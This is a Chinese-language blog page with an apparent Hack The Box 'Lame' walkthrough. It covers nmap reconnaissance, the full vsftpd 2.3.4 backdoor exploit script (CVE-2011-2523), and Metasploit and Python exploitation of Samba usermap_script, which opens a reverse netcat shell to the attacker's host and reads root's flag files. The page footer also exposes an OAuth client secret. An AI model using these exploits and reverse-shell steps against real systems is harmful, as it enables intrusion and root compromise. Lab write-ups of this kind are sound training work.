<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Lame - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Lameé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-01 00:25 EST Nmap scan report">
<meta property="og:type" content="article">
<meta property="og:title" content="Lame - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Lameé¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-01 00:25 EST Nmap scan report">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/64e0a668-9ebf-4cfc-8c43-522c03c10081.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/d4ae2982-a13e-445c-b71e-58c3770f1589.png">
<meta property="article:published_time" content="2022-03-01T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:45:59.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/64e0a668-9ebf-4cfc-8c43-522c03c10081.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                è¯·æˆ‘å–å’–å•¡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Lame - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Lame - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-03-01T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-03-01
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Lame"><span class="post-toc-text">Hackthebox - Lame</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Ftp"><span class="post-toc-text">Ftp</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Metasploit"><span class="post-toc-text">Metasploit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Exploit"><span class="post-toc-text">Exploit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Samba"><span class="post-toc-text">Samba</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#å…¶ä»–æ€è·¯"><span class="post-toc-text">å…¶ä»–æ€è·¯</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Lame"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Lame - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-03-01 19:38:36" datetime="2022-03-01T11:38:36.000Z"  itemprop="datePublished">2022-03-01</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Lame"><a href="#Hackthebox-Lame" class="headerlink" title="Hackthebox - Lame"></a>Hackthebox - Lame</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><img src="/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/64e0a668-9ebf-4cfc-8c43-522c03c10081.png" class>

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h2><img src="/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/d4ae2982-a13e-445c-b71e-58c3770f1589.png" class>

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 00:25 EST
Nmap scan report for 10.10.10.3
Host is up (0.51s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m20s, deviation: 3h32m12s, median: 17s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-03-01T00:26:29-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)                                                                                                                                                              
|_smb2-time: Protocol negotiation failed (SMB2)                                                                                                                                                                     

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   503.51 ms 10.10.16.1
2   503.58 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.36 seconds
</code></pre>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h3><p>è¿™è¾¹FTPçš„ç‰ˆæœ¬æ˜¯vsftpd 2.3.4ï¼Œæˆ‘å¯»æ€å¯èƒ½æœ‰æ¼æ´ï¼Œå»æœç´¢ä¸€ä¸‹çœ‹çœ‹</p>
<pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªåé—¨æ¼æ´æ‰§è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªè¿˜æ˜¯msfçš„ï¼Œå»åˆ©ç”¨çœ‹çœ‹</p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><pre><code class="bash">msf6 &gt; search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
</code></pre>
<p>å’±ä»¬ä½¿ç”¨å®ƒæ¥åˆ©ç”¨æ¼æ´</p>
<pre><code class="bash">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.3
rhosts =&gt; 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit 

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
whoami
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; whoami
[*] exec: whoami

root
</code></pre>
<p>è¿™è¾¹ç¡®å®æ‰§è¡ŒæˆåŠŸäº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰è·å¾—ä¸€ä¸ªå¯ç”¨çš„shellï¼Œè¿™å¹¶ä¸ç¬¦åˆæˆ‘ä»¬çš„ç›®çš„ï¼Œè€Œä¸”æˆ‘çš„åŸåˆ™ä¸€å‘æ˜¯èƒ½ä¸ä½¿ç”¨msfå°±ä¸ä½¿ç”¨</p>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ä¸ªæ¼æ´</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# locate unix/remote/49757.py
/usr/share/exploitdb/exploits/unix/remote/49757.py


â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~/Desktop/Exploit.py
</code></pre>
<p>ç»™å¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹</p>
<pre><code class="python"># Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   

from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print(&#39;   [+]Exiting...&#39;)
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user=&quot;USER nergal:)&quot;
password=&quot;PASS pass&quot;

tn=Telnet(host, portFTP)
tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line
tn.write(user.encode(&#39;ascii&#39;) + b&quot;\n&quot;)
tn.read_until(b&quot;password.&quot;) #if necessary, edit this line
tn.write(password.encode(&#39;ascii&#39;) + b&quot;\n&quot;)

tn2=Telnet(host, 6200)
print(&#39;Success, shell opened&#39;)
print(&#39;Send `exit` to quit shell&#39;)
tn2.interact()
</code></pre>
<p>è¿™è¾¹æˆ‘å°è¯•åˆ©ç”¨åï¼Œå‘ç°åˆ©ç”¨å¤±è´¥äº†</p>
<p>æ¢ä¸ªå…¶ä»–æ€è·¯çœ‹çœ‹</p>
<h3 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h3><pre><code class="php">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame]
â””â”€# searchsploit Samba 3.0.20       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                                                                            | multiple/remote/10095.txt
Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)                                                                                                  | unix/remote/16320.rb
Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt
Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                     | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>è¿™è¾¹ä¹Ÿæ˜¯æœ‰ä¸€ä¸ªmsfçš„è„šæœ¬ï¼Œå…ˆç”¨ç”¨çœ‹å§</p>
<p>ä½¿ç”¨msfconsoleå¯åŠ¨msf</p>
<pre><code class="php">msf6 &gt; search Samba 3.0.20 

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba &quot;username map script&quot; Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 &gt; use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) &gt; use exploit/multi/samba/usermap_script
[*] Using configured payload cmd/unix/reverse_netcat
</code></pre>
<p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹éœ€è¦ä¿®æ”¹å“ªäº›é…ç½®</p>
<pre><code class="php">msf6 exploit(multi/samba/usermap_script) &gt; options 

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic
</code></pre>
<p>ç„¶åå’±ä»¬å¼€å§‹ä¿®æ”¹</p>
<pre><code class="php">msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3
rhosts =&gt; 10.10.10.3
msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
rport =&gt; 445
msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.16.2
lhost =&gt; 10.10.16.2
</code></pre>
<p>ç„¶åå¼€å§‹åˆ©ç”¨</p>
<pre><code class="php">msf6 exploit(multi/samba/usermap_script) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Command shell session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.3:45192) at 2022-03-01 01:05:18 -0500

whoami
root
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°rootæƒé™</p>
<p>ç„¶åè¾“å…¥shellè¿›å…¥shellæ§åˆ¶æ¨¡å¼</p>
<pre><code class="php">root@lame:/# whoami&amp;&amp;id
whoami&amp;&amp;id
root
uid=0(root) gid=0(root)
</code></pre>
<pre><code class="php">root@lame:/home/makis# cat user.txt
cat user.txt
7547181b7a57b001cf0ba3f497b5e8b0
</code></pre>
<p>åœ¨&#x2F;home&#x2F;makis&#x2F;user.txtä¸­æ‰¾åˆ°äº†useræƒé™çš„flagæ–‡ä»¶</p>
<pre><code class="php">root@lame:/home/makis# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
a07cd9e7c60b75852e396c4320f5fae4
</code></pre>
<p>åœ¨&#x2F;root&#x2F;root.txtä¸­æ‰¾åˆ°äº†rootæƒé™çš„flag</p>
<h2 id="å…¶ä»–æ€è·¯"><a href="#å…¶ä»–æ€è·¯" class="headerlink" title="å…¶ä»–æ€è·¯"></a>å…¶ä»–æ€è·¯</h2><p>åŸºäºå¯ä»¥ä¸ç”¨è‡ªåŠ¨åŒ–å·¥å…·å°±ä¸ç”¨çš„åŸåˆ™ï¼Œå’±ä»¬è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªpythonçš„åˆ©ç”¨å·¥å…·</p>
<blockquote>
<p><a href="https://github.com/ozuma/CVE-2007-2447" target="_blank" rel="noopener">https://github.com/ozuma/CVE-2007-2447</a></p>
</blockquote>
<p>é¦–å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£</p>
<p>ç„¶åè¿›è¡Œåˆ©ç”¨</p>
<pre><code class="php">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Lame]
â””â”€# python3 Exploit.py 10.10.10.3 445 10.10.16.2 4444
</code></pre>
<p>æ ¼å¼åˆ†åˆ«æ˜¯python3 åˆ©ç”¨å·¥å…· é¶æœºIP é¶æœºç«¯å£ æœ¬åœ°IP æœ¬åœ°ç«¯å£</p>
<pre><code class="php">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 43672
python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
root@lame:/# whoami&amp;&amp;id
whoami&amp;&amp;id
root
uid=0(root) gid=0(root)
</code></pre>
<p>è¿™æ ·åœ¨ä¸ä½¿ç”¨msfçš„æƒ…å†µä¸‹ï¼Œä¹ŸæˆåŠŸæ‹¿åˆ°äº†rootæƒé™</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/&title=ã€ŠLame - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/&title=ã€ŠLame - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠLame - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Legacy - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Undetected - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2024</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/&title=ã€ŠLame - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
